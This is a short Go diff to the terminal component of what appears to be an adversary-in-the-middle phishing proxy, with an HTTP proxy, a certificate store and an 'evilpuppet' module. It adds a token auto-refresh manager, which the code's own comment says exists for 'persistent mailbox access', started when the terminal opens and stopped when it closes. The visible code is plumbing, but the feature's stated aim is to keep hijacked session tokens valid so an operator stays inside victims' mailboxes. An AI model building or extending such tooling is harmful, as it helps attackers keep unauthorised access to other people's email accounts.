@@ -34,14 +34,15 @@ const (
 )
 
 type Terminal struct {
-	rl        *readline.Instance
-	completer *readline.PrefixCompleter
-	cfg       *Config
-	crt_db    *CertDb
-	p         *HttpProxy
-	db        *database.Database
-	hlp       *Help
-	developer bool
+	rl               *readline.Instance
+	completer        *readline.PrefixCompleter
+	cfg              *Config
+	crt_db           *CertDb
+	p                *HttpProxy
+	db               *database.Database
+	hlp              *Help
+	developer        bool
+	tokenAutoRefresh *TokenAutoRefreshManager
 }
 
 func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
@@ -78,10 +79,17 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 		log.Info("[evilpuppet] Loaded from config: enabled, timeout=%ds", cfg.GetEvilPuppetTimeout())
 	}
 
+	// Start token auto-refresh for persistent mailbox access
+	t.tokenAutoRefresh = NewTokenAutoRefreshManager(db)
+	t.tokenAutoRefresh.Start()
+
 	return t, nil
 }
 
 func (t *Terminal) Close() {
+	if t.tokenAutoRefresh != nil {
+		t.tokenAutoRefresh.Stop()
+	}
 	t.rl.Close()
 }
 
